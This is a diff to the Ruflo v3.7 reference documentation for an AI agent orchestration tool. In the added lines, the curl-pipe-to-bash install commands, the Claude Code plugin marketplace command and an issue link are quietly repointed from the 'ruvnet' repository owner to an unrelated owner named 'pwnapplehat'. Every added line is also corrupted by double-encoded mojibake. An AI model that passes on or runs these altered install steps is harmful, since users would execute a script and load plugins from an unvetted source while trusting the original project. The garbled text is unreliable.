@@ -2,7 +2,7 @@
 
 > Complete reference documentation for Ruflo v3.7. For a quick overview, see the [README](../README.md).
 >
-> **Latest:** `npx ruflo@latest --version` Ã¢â€ â€™ **3.7.0-alpha.8**. See [What's new in 3.7](#whats-new-in-37) below.
+> **Latest:** `npx ruflo@latest --version` ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ **3.7.0-alpha.8**. See [What's new in 3.7](#whats-new-in-37) below.
 
 ---
 
@@ -27,11 +27,11 @@
 
 ## What's new in 3.7
 
-Recent releases (3.7.0-alpha.1 through alpha.8) shipped four substantial pieces. End-user CLI surface is unchanged Ã¢â‚¬â€ these are substrate improvements that compound on every existing feature.
+Recent releases (3.7.0-alpha.1 through alpha.8) shipped four substantial pieces. End-user CLI surface is unchanged ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â these are substrate improvements that compound on every existing feature.
 
-### `@claude-flow/cli-core` (alpha.5+) Ã¢â‚¬â€ fast lite path for plugin scripts
+### `@claude-flow/cli-core` (alpha.5+) ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â fast lite path for plugin scripts
 
-A new sibling package that handles **memory commands only** (no SQLite, no HNSW, no ONNX). Cold-cache `npx` wall-time drops from ~35s to ~1.5s Ã¢â‚¬â€ a measured **22.9Ãƒâ€” speedup** for plugin authors.
+A new sibling package that handles **memory commands only** (no SQLite, no HNSW, no ONNX). Cold-cache `npx` wall-time drops from ~35s to ~1.5s ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â a measured **22.9ÃƒÆ’Ã¢â‚¬â€ speedup** for plugin authors.
 
 ```bash
 # Plugin scripts can opt in via env flag:
@@ -44,28 +44,28 @@ The full `@claude-flow/cli` is unchanged for end users. Reference: [`v3/@claude-
 
 ### Thompson sampling model router (alpha.5)
 
-The 3-tier model selector (Haiku / Sonnet / Opus) is now a **cost-adjusted multi-armed bandit** instead of static thresholds. `hooks_model-outcome` calls update Beta(ÃŽÂ±, ÃŽÂ²) priors per tier; `hooks_model-route` samples ÃŽÂ¸ ~ Beta(ÃŽÂ±, ÃŽÂ²) and picks argmax. After ~50 outcomes the routing distribution self-corrects against tier overuse Ã¢â‚¬â€ no manual threshold tuning. Cost: 45 Ã‚Âµs per route call.
+The 3-tier model selector (Haiku / Sonnet / Opus) is now a **cost-adjusted multi-armed bandit** instead of static thresholds. `hooks_model-outcome` calls update Beta(ÃƒÅ½Ã‚Â±, ÃƒÅ½Ã‚Â²) priors per tier; `hooks_model-route` samples ÃƒÅ½Ã‚Â¸ ~ Beta(ÃƒÅ½Ã‚Â±, ÃƒÅ½Ã‚Â²) and picks argmax. After ~50 outcomes the routing distribution self-corrects against tier overuse ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â no manual threshold tuning. Cost: 45 Ãƒâ€šÃ‚Âµs per route call.
 
-### `@claude-flow/neural@3.0.0-alpha.8` Ã¢â‚¬â€ substrate upgrades
+### `@claude-flow/neural@3.0.0-alpha.8` ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â substrate upgrades
 
 Six concrete additions to the neural package:
 
-1. **Persistence** Ã¢â‚¬â€ `serialize()` / `deserialize()` on `SONAManager`, `ReasoningBank`, `PatternLearner`. Process restarts no longer wipe state.
-2. **Seedable PRNG** Ã¢â‚¬â€ `Mulberry32` + `setGlobalRng` for reproducible training runs and deterministic tests.
-3. **Self-consistency orchestrator** Ã¢â‚¬â€ `selfConsistency(N, op, aggregator)` (Wang et al. 2022). 5Ã¢â‚¬â€œ15pp accuracy on reasoning tasks at Nx compute.
+1. **Persistence** ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â `serialize()` / `deserialize()` on `SONAManager`, `ReasoningBank`, `PatternLearner`. Process restarts no longer wipe state.
+2. **Seedable PRNG** ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â `Mulberry32` + `setGlobalRng` for reproducible training runs and deterministic tests.
+3. **Self-consistency orchestrator** ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â `selfConsistency(N, op, aggregator)` (Wang et al. 2022). 5ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Å“15pp accuracy on reasoning tasks at Nx compute.
 4. **Flash Attention + MoE routing** migrated from cli into the package (1,679 LOC moved). Single source of truth.
-5. **Retrieval-path observability** Ã¢â‚¬â€ `hnswRetrievalCount` vs `bruteForceRetrievalCount` in stats so you can tell which path your queries actually hit.
-6. **80+ npm SEO keywords** Ã¢â‚¬â€ package now discoverable for `ai-agents`, `multi-agent`, `RL`, `LoRA`, `EWC`, etc.
+5. **Retrieval-path observability** ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â `hnswRetrievalCount` vs `bruteForceRetrievalCount` in stats so you can tell which path your queries actually hit.
+6. **80+ npm SEO keywords** ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â package now discoverable for `ai-agents`, `multi-agent`, `RL`, `LoRA`, `EWC`, etc.
 
 ### `agentdb_*-delete` MCP tools (alpha.8)
 
 Three new MCP tools wired through agentdb@3.0.0-alpha.13's native Cypher-routed delete API:
 
-- `agentdb_hierarchical-delete` Ã¢â‚¬â€ calls `ReflexionMemory.deleteEpisode` (graph + vector + SQL all-in-one)
-- `agentdb_causal-edge-delete` Ã¢â‚¬â€ calls `GraphDatabaseAdapter.deleteEdgesByEndpoints(from, to, relation?)` (Cypher-injection-safe)
-- `agentdb_causal-node-delete` Ã¢â‚¬â€ calls `GraphDatabaseAdapter.deleteNode(id, {cascade: true})` returns native `{deletedNode, deletedEdges}` audit
+- `agentdb_hierarchical-delete` ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â calls `ReflexionMemory.deleteEpisode` (graph + vector + SQL all-in-one)
+- `agentdb_causal-edge-delete` ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â calls `GraphDatabaseAdapter.deleteEdgesByEndpoints(from, to, relation?)` (Cypher-injection-safe)
+- `agentdb_causal-node-delete` ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â calls `GraphDatabaseAdapter.deleteNode(id, {cascade: true})` returns native `{deletedNode, deletedEdges}` audit
 
-All wrapped in MutationGuard (fail-closed) + AttestationLog (audit). Unblocks `/adr-index` re-index when ADR files are deleted from disk Ã¢â‚¬â€ stale nodes + dangling `supersedes` / `amends` / `related` / `depends-on` edges are now scrubbable. Closed [#1784](https://github.com/ruvnet/ruflo/issues/1784).
+All wrapped in MutationGuard (fail-closed) + AttestationLog (audit). Unblocks `/adr-index` re-index when ADR files are deleted from disk ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â stale nodes + dangling `supersedes` / `amends` / `related` / `depends-on` edges are now scrubbable. Closed [#1784](https://github.com/pwnapplehat/ruflo/issues/1784).
 
 ### What didn't change
 
@@ -86,39 +86,39 @@ Ruflo is a comprehensive AI agent orchestration framework that transforms Claude
 ### Self-Learning/Self-Optimizing Agent Architecture
 
 ```
-User Ã¢â€ â€™ Ruflo (CLI/MCP) Ã¢â€ â€™ Router Ã¢â€ â€™ Swarm Ã¢â€ â€™ Agents Ã¢â€ â€™ Memory Ã¢â€ â€™ LLM Providers
-                       Ã¢â€ â€˜                          Ã¢â€ â€œ
-                       Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ Learning Loop Ã¢â€ ÂÃ¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ
+User ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Ruflo (CLI/MCP) ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Router ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Swarm ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Agents ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Memory ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ LLM Providers
+                       ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬Ëœ                          ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬Å“
+                       ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ Learning Loop ÃƒÂ¢Ã¢â‚¬Â Ã‚ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“
 ```
 
 <details>
-<summary>Ã°Å¸â€œÂ <strong>Expanded Architecture</strong> Ã¢â‚¬â€ Full system diagram with RuVector intelligence</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã‚Â <strong>Expanded Architecture</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Full system diagram with RuVector intelligence</summary>
 
 ```mermaid
 flowchart TB
-    subgraph USER["Ã°Å¸â€˜Â¤ User Layer"]
+    subgraph USER["ÃƒÂ°Ã…Â¸Ã¢â‚¬ËœÃ‚Â¤ User Layer"]
         U[User]
     end
 
-    subgraph ENTRY["Ã°Å¸Å¡Âª Entry Layer"]
+    subgraph ENTRY["ÃƒÂ°Ã…Â¸Ã…Â¡Ã‚Âª Entry Layer"]
         CLI[CLI / MCP Server]
         AID[AIDefence Security]
     end
 
-    subgraph ROUTING["Ã°Å¸Â§Â­ Routing Layer"]
+    subgraph ROUTING["ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â­ Routing Layer"]
         QL[Q-Learning Router]
         MOE[MoE - 8 Experts]
         SK[Skills - 130+]
         HK[Hooks - 27]
     end
 
-    subgraph SWARM["Ã°Å¸ÂÂ Swarm Coordination"]
+    subgraph SWARM["ÃƒÂ°Ã…Â¸Ã‚ÂÃ‚Â Swarm Coordination"]
         TOPO[Topologies<br/>mesh/hier/ring/star]
         CONS[Consensus<br/>Raft/BFT/Gossip]
         CLM[Claims<br/>Human-Agent Coord]
     end
 
-    subgraph AGENTS["Ã°Å¸Â¤â€“ 100+ Agents"]
+    subgraph AGENTS["ÃƒÂ°Ã…Â¸Ã‚Â¤Ã¢â‚¬â€œ 100+ Agents"]
         AG1[coder]
         AG2[tester]
         AG3[reviewer]
@@ -127,13 +127,13 @@ flowchart TB
         AG6[...]
     end
 
-    subgraph RESOURCES["Ã°Å¸â€œÂ¦ Resources"]
+    subgraph RESOURCES["ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã‚Â¦ Resources"]
         MEM[(Memory<br/>AgentDB)]
         PROV[Providers<br/>Claude/GPT/Gemini/Ollama]
         WORK[Workers - 12<br/>ultralearn/audit/optimize]
     end
 
-    subgraph RUVECTOR["Ã°Å¸Â§Â  RuVector Intelligence Layer"]
+    subgraph RUVECTOR["ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â  RuVector Intelligence Layer"]
         direction TB
         subgraph ROW1[" "]
             SONA[SONA<br/>Self-Optimize<br/>&lt;0.05ms]
@@ -143,7 +143,7 @@ flowchart TB
         subgraph ROW2[" "]
             HNSW[HNSW<br/>HNSW-indexed]
             RB[ReasoningBank<br/>Pattern Store]
-            HYP[Hyperbolic<br/>PoincarÃƒÂ©]
+            HYP[Hyperbolic<br/>PoincarÃƒÆ’Ã‚Â©]
         end
         subgraph ROW3[" "]
             LORA[LoRA/Micro<br/>low-rank adaptation]
@@ -152,7 +152,7 @@ flowchart TB
         end
     end
 
-    subgraph LEARNING["Ã°Å¸â€â€ž Learning Loop"]
+    subgraph LEARNING["ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ¢â‚¬Å¾ Learning Loop"]
         L1[RETRIEVE] --> L2[JUDGE] --> L3[DISTILL] --> L4[CONSOLIDATE] --> L5[ROUTE]
     end
 
@@ -186,7 +186,7 @@ flowchart TB
 | **EWC++** | Elastic Weight Consolidation - prevents catastrophic forgetting | Preserves learned patterns |
 | **Flash Attention** | Optimized attention computation | 2-7x speedup (benchmarked) |
 | **HNSW** | Hierarchical Navigable Small World vector search | Sub-millisecond retrieval |
-| **ReasoningBank** | Pattern storage with trajectory learning | RETRIEVEÃ¢â€ â€™JUDGEÃ¢â€ â€™DISTILL |
+| **ReasoningBank** | Pattern storage with trajectory learning | RETRIEVEÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢JUDGEÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢DISTILL |
 | **Hyperbolic** | Poincare ball embeddings for hierarchical data | Better code relationships |
 | **LoRA/MicroLoRA** | Low-Rank Adaptation for efficient fine-tuning | Lightweight adaptation |
 | **Int8 Quantization** | Memory-efficient weight storage | ~4x memory reduction |
@@ -204,40 +204,40 @@ npx ruflo@latest hooks intelligence --status
 
 ```bash
 # One-line install (recommended)
-curl -fsSL https://cdn.jsdelivr.net/gh/ruvnet/ruflo@main/scripts/install.sh | bash
+curl -fsSL https://cdn.jsdelivr.net/gh/pwnapplehat/ruflo@main/scripts/install.sh | bash
 
 # Or full setup with MCP + diagnostics
-curl -fsSL https://cdn.jsdelivr.net/gh/ruvnet/ruflo@main/scripts/install.sh | bash -s -- --full
+curl -fsSL https://cdn.jsdelivr.net/gh/pwnapplehat/ruflo@main/scripts/install.sh | bash -s -- --full
 
 # Or via npx
 npx ruflo@latest init wizard
 ```
 
-> **New to Ruflo?** You don't need to learn 310+ MCP tools or 26 CLI commands. After running `init`, just use Claude Code normally Ã¢â‚¬â€ the hooks system automatically routes tasks to the right agents, learns from successful patterns, and coordinates multi-agent work in the background. The advanced tools exist for fine-grained control when you need it.
+> **New to Ruflo?** You don't need to learn 310+ MCP tools or 26 CLI commands. After running `init`, just use Claude Code normally ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â the hooks system automatically routes tasks to the right agents, learns from successful patterns, and coordinates multi-agent work in the background. The advanced tools exist for fine-grained control when you need it.
 
 ---
 ### Key Capabilities
 
-Ã°Å¸Â¤â€“ **100+ Specialized Agents** - Ready-to-use AI agents for coding, code review, testing, security audits, documentation, and DevOps. Each agent is optimized for its specific role.
+ÃƒÂ°Ã…Â¸Ã‚Â¤Ã¢â‚¬â€œ **100+ Specialized Agents** - Ready-to-use AI agents for coding, code review, testing, security audits, documentation, and DevOps. Each agent is optimized for its specific role.
 
-Ã°Å¸ÂÂ **Coordinated Agent Teams** - Run unlimited agents simultaneously in organized swarms. Agents spawn sub-workers, communicate, share context, and divide work automatically using hierarchical (queen/workers) or mesh (peer-to-peer) patterns.
+ÃƒÂ°Ã…Â¸Ã‚ÂÃ‚Â **Coordinated Agent Teams** - Run unlimited agents simultaneously in organized swarms. Agents spawn sub-workers, communicate, share context, and divide work automatically using hierarchical (queen/workers) or mesh (peer-to-peer) patterns.
 
-Ã°Å¸Â§Â  **Learns From Your Workflow** - The system remembers what works. Successful patterns are stored and reused, routing similar tasks to the best-performing agents. Gets smarter over time.
+ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â  **Learns From Your Workflow** - The system remembers what works. Successful patterns are stored and reused, routing similar tasks to the best-performing agents. Gets smarter over time.
 
-Ã°Å¸â€Å’ **Works With Any LLM** - Switch between Claude, GPT, Gemini, Cohere, or local models like Llama. Automatic failover if one provider is unavailable. Smart routing picks the cheapest option that meets quality requirements.
+ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ…â€™ **Works With Any LLM** - Switch between Claude, GPT, Gemini, Cohere, or local models like Llama. Automatic failover if one provider is unavailable. Smart routing picks the cheapest option that meets quality requirements.
 
-Ã¢Å¡Â¡ **Plugs Into Claude Code** - Native integration via MCP (Model Context Protocol). Use ruflo commands directly in your Claude Code sessions with full tool access.
+ÃƒÂ¢Ã…Â¡Ã‚Â¡ **Plugs Into Claude Code** - Native integration via MCP (Model Context Protocol). Use ruflo commands directly in your Claude Code sessions with full tool access.
 
-Ã°Å¸â€â€™ **Production-Ready Security** - Built-in protection against prompt injection, input validation, path traversal prevention, command injection blocking, and safe credential handling.
+ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ¢â‚¬â„¢ **Production-Ready Security** - Built-in protection against prompt injection, input validation, path traversal prevention, command injection blocking, and safe credential handling.
 
-Ã°Å¸Â§Â© **Extensible Plugin System** - Add custom capabilities with the plugin SDK. Create workers, hooks, providers, and security modules. Share plugins via the decentralized IPFS marketplace.
+ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â© **Extensible Plugin System** - Add custom capabilities with the plugin SDK. Create workers, hooks, providers, and security modules. Share plugins via the decentralized IPFS marketplace.
 
 ---
 
 ### A multi-purpose Agent Tool Kit 
 
 <details>
-<summary>Ã°Å¸â€â€ž <strong>Core Flow</strong> Ã¢â‚¬â€ How requests move through the system</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ¢â‚¬Å¾ <strong>Core Flow</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â How requests move through the system</summary>
 
 Every request flows through four layers: from your CLI or Claude Code interface, through intelligent routing, to specialized agents, and finally to LLM providers for reasoning.
 
@@ -251,9 +251,9 @@ Every request flows through four layers: from your CLI or Claude Code interface,
 </details>
 
 <details>
-<summary>Ã°Å¸ÂÂ <strong>Swarm Coordination</strong> Ã¢â‚¬â€ How agents work together</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚ÂÃ‚Â <strong>Swarm Coordination</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â How agents work together</summary>
 
-Agents organize into swarms led by queens that coordinate work, prevent drift, and reach consensus on decisionsÃ¢â‚¬â€even when some agents fail.
+Agents organize into swarms led by queens that coordinate work, prevent drift, and reach consensus on decisionsÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Âeven when some agents fail.
 
 | Layer | Components | What It Does |
 |-------|------------|--------------|
@@ -263,16 +263,16 @@ Agents organize into swarms led by queens that coordinate work, prevent drift, a
 | Consensus | Byzantine, Raft, Gossip, CRDT, Quorum | Fault-tolerant decisions (2/3 majority for BFT) |
 
 **Hive Mind Capabilities:**
-- Ã°Å¸ÂÂ **Queen Types**: Strategic (planning), Tactical (execution), Adaptive (optimization)
-- Ã°Å¸â€˜Â· **8 Worker Types**: Researcher, Coder, Analyst, Tester, Architect, Reviewer, Optimizer, Documenter
-- Ã°Å¸â€”Â³Ã¯Â¸Â **5 Consensus Algorithms**: Byzantine (f < n/3), Raft (leader-elected), Gossip (eventually consistent), CRDT (conflict-free), Quorum (configurable threshold)
-- Ã°Å¸Â§Â  **Collective Memory**: Shared knowledge, LRU cache, SQLite persistence with WAL
-- Ã¢Å¡Â¡ **Performance**: Fast batch spawning with parallel agent coordination
+- ÃƒÂ°Ã…Â¸Ã‚ÂÃ‚Â **Queen Types**: Strategic (planning), Tactical (execution), Adaptive (optimization)
+- ÃƒÂ°Ã…Â¸Ã¢â‚¬ËœÃ‚Â· **8 Worker Types**: Researcher, Coder, Analyst, Tester, Architect, Reviewer, Optimizer, Documenter
+- ÃƒÂ°Ã…Â¸Ã¢â‚¬â€Ã‚Â³ÃƒÂ¯Ã‚Â¸Ã‚Â **5 Consensus Algorithms**: Byzantine (f < n/3), Raft (leader-elected), Gossip (eventually consistent), CRDT (conflict-free), Quorum (configurable threshold)
+- ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â  **Collective Memory**: Shared knowledge, LRU cache, SQLite persistence with WAL
+- ÃƒÂ¢Ã…Â¡Ã‚Â¡ **Performance**: Fast batch spawning with parallel agent coordination
 
 </details>
 
 <details>
-<summary>Ã°Å¸Â§Â  <strong>Intelligence & Memory</strong> Ã¢â‚¬â€ How the system learns and remembers</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â  <strong>Intelligence & Memory</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â How the system learns and remembers</summary>
 
 The system stores successful patterns in vector memory, builds a knowledge graph for structural understanding, learns from outcomes via neural networks, and adapts routing based on what works best.
 
@@ -289,7 +289,7 @@ The system stores successful patterns in vector memory, builds a knowledge graph
 </details>
 
 <details>
-<summary>Ã¢Å¡Â¡ <strong>Optimization</strong> Ã¢â‚¬â€ How to reduce cost and latency</summary>
+<summary>ÃƒÂ¢Ã…Â¡Ã‚Â¡ <strong>Optimization</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â How to reduce cost and latency</summary>
 
 Skip expensive LLM calls for simple tasks using WebAssembly transforms, and compress tokens to reduce API costs by 30-50%.
 
@@ -301,7 +301,7 @@ Skip expensive LLM calls for simple tasks using WebAssembly transforms, and comp
 </details>
 
 <details>
-<summary>Ã°Å¸â€Â§ <strong>Operations</strong> Ã¢â‚¬â€ Background services and integrations</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ‚Â§ <strong>Operations</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Background services and integrations</summary>
 
 Background daemons handle security audits, performance optimization, and session persistence automatically while you work.
 
@@ -316,7 +316,7 @@ Background daemons handle security audits, performance optimization, and session
 </details>
 
 <details>
-<summary>Ã°Å¸Å½Â¯ <strong>Task Routing</strong> Ã¢â‚¬â€ Extend your Claude Code subscription by 250%</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã…Â½Ã‚Â¯ <strong>Task Routing</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Extend your Claude Code subscription by 250%</summary>
 
 Smart routing skips expensive LLM calls when possible. Simple edits use WASM (free), medium tasks use cheaper models. This can extend your Claude Code usage by 250% or save significantly on direct API costs.
 
@@ -329,7 +329,7 @@ Smart routing skips expensive LLM calls when possible. Simple edits use WASM (fr
 </details>
 
 <details>
-<summary>Ã¢Å¡Â¡ <strong>Agent Booster (WASM)</strong> Ã¢â‚¬â€ Skip LLM for simple code transforms</summary>
+<summary>ÃƒÂ¢Ã…Â¡Ã‚Â¡ <strong>Agent Booster (WASM)</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Skip LLM for simple code transforms</summary>
 
 Agent Booster uses WebAssembly to handle simple code transformations without calling the LLM at all. When the hooks system detects a simple task, it routes directly to Agent Booster for instant results.
 
@@ -337,10 +337,10 @@ Agent Booster uses WebAssembly to handle simple code transformations without cal
 
 | Intent | What It Does | Example |
 |--------|--------------|---------|
-| `var-to-const` | Convert var/let to const | `var x = 1` Ã¢â€ â€™ `const x = 1` |
-| `add-types` | Add TypeScript type annotations | `function foo(x)` Ã¢â€ â€™ `function foo(x: string)` |
+| `var-to-const` | Convert var/let to const | `var x = 1` ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ `const x = 1` |
+| `add-types` | Add TypeScript type annotations | `function foo(x)` ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ `function foo(x: string)` |
 | `add-error-handling` | Wrap in try/catch | Adds proper error handling |
-| `async-await` | Convert promises to async/await | `.then()` chains Ã¢â€ â€™ `await` |
+| `async-await` | Convert promises to async/await | `.then()` chains ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ `await` |
 | `add-logging` | Add console.log statements | Adds debug logging |
 | `remove-console` | Strip console.* calls | Removes all console statements |
 
@@ -351,11 +351,11 @@ When you see these in hook output, the system is telling you how to optimize:
 ```bash
 # Agent Booster available - skip LLM entirely
 [AGENT_BOOSTER_AVAILABLE] Intent: var-to-const
-Ã¢â€ â€™ Use Edit tool directly, instant (regex-based, no LLM call) than LLM
+ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Use Edit tool directly, instant (regex-based, no LLM call) than LLM
 
 # Model recommendation for Task tool
 [TASK_MODEL_RECOMMENDATION] Use model="haiku"
-Ã¢â€ â€™ Pass model="haiku" to Task tool for cost savings
+ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Pass model="haiku" to Task tool for cost savings
 ```
 
 **Performance:**
@@ -369,7 +369,7 @@ When you see these in hook output, the system is telling you how to optimize:
 </details>
 
 <details>
-<summary>Ã°Å¸â€™Â° <strong>Token Optimizer</strong> Ã¢â‚¬â€ reduces token usage via pattern caching and smart routing</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬â„¢Ã‚Â° <strong>Token Optimizer</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â reduces token usage via pattern caching and smart routing</summary>
 
 The Token Optimizer integrates agentic-flow optimizations to reduce API costs by compressing context and caching results.
 
@@ -402,7 +402,7 @@ const config = optimizer.getOptimalConfig(agentCount);
 </details>
 
 <details>
-<summary>Ã°Å¸â€ºÂ¡Ã¯Â¸Â <strong>Anti-Drift Swarm Configuration</strong> Ã¢â‚¬â€ Prevent goal drift in multi-agent work</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂºÃ‚Â¡ÃƒÂ¯Ã‚Â¸Ã‚Â <strong>Anti-Drift Swarm Configuration</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Prevent goal drift in multi-agent work</summary>
 
 Complex swarms can drift from their original goals. Ruflo V3 includes anti-drift defaults that prevent agents from going off-task.
 
@@ -433,7 +433,7 @@ swarm_init({
 - Short task cycles with verification gates
 - Hierarchical coordinator reviews all outputs
 
-**Task Ã¢â€ â€™ Agent Routing (Anti-Drift):**
+**Task ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Agent Routing (Anti-Drift):**
 
 | Code | Task Type | Recommended Agents |
 |------|-----------|-------------------|
@@ -452,12 +452,12 @@ swarm_init({
 |------------|-------------------|---------------------------|
 | **Agent Collaboration** | Agents work in isolation, no shared context | Agents collaborate via swarms with shared memory and consensus |
 | **Coordination** | Manual orchestration between tasks | Queen-led hierarchy with 3 consensus algorithms (Raft, Byzantine, Gossip) |
-| **Hive Mind** | Ã¢â€ºâ€ Not available | Ã°Å¸ÂÂ Queen-led swarms with collective intelligence, 3 queen types, 8 worker types |
-| **Consensus** | Ã¢â€ºâ€ No multi-agent decisions | Byzantine fault-tolerant voting (f < n/3), weighted, majority |
+| **Hive Mind** | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â Not available | ÃƒÂ°Ã…Â¸Ã‚ÂÃ‚Â Queen-led swarms with collective intelligence, 3 queen types, 8 worker types |
+| **Consensus** | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â No multi-agent decisions | Byzantine fault-tolerant voting (f < n/3), weighted, majority |
 | **Memory** | Session-only, no persistence | HNSW vector memory with sub-ms retrieval + knowledge graph |
-| **Vector Database** | Ã¢â€ºâ€ No native support | Ã°Å¸ÂËœ RuVector PostgreSQL with 77+ SQL functions, ~61Ã‚Âµs search, 16,400 QPS |
-| **Knowledge Graph** | Ã¢â€ºâ€ Flat insight lists | PageRank + community detection identifies influential insights (ADR-049) |
-| **Collective Memory** | Ã¢â€ºâ€ No shared knowledge | Shared knowledge base with LRU cache, SQLite persistence, 8 memory types |
+| **Vector Database** | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â No native support | ÃƒÂ°Ã…Â¸Ã‚ÂÃ‹Å“ RuVector PostgreSQL with 77+ SQL functions, ~61Ãƒâ€šÃ‚Âµs search, 16,400 QPS |
+| **Knowledge Graph** | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â Flat insight lists | PageRank + community detection identifies influential insights (ADR-049) |
+| **Collective Memory** | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â No shared knowledge | Shared knowledge base with LRU cache, SQLite persistence, 8 memory types |
 | **Learning** | Static behavior, no adaptation | SONA self-learning with sub-millisecond pattern matching, LearningBridge for insights |
 | **Agent Scoping** | Single project scope | 3-scope agent memory (project/local/user) with cross-agent transfer |
 | **Task Routing** | You decide which agent to use | Intelligent routing based on learned patterns (89% accuracy) |
@@ -473,7 +473,7 @@ swarm_init({
 
 - **Node.js 20+** (required)
 - **npm 9+** / **pnpm** / **bun** package manager
-- **Cursor IDE** (the host Ã¢â‚¬â€ no Claude Code or Codex binary required)
+- **Cursor IDE** (the host ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â no Claude Code or Codex binary required)
 
 ### Installation
 
@@ -560,7 +560,7 @@ Install Ruflo as a native Claude Code plugin -- adds skills, commands, agents, a
 
 ```bash
 # Add the marketplace (one-time)
-/plugin marketplace add ruvnet/ruflo
+/plugin marketplace add pwnapplehat/ruflo
 
 # Install individual plugins
 /plugin install ruflo-core@ruflo         # MCP server + base agents
@@ -576,7 +576,7 @@ Install Ruflo as a native Claude Code plugin -- adds skills, commands, agents, a
 After installing, new `/slash-commands` and agent types are available immediately. Run `/reload-plugins` if needed.
 
 <details>
-<summary>Ã°Å¸Â¤â€“ <strong>OpenAI Codex CLI Support</strong> Ã¢â‚¬â€ Full Codex integration with self-learning</summary>
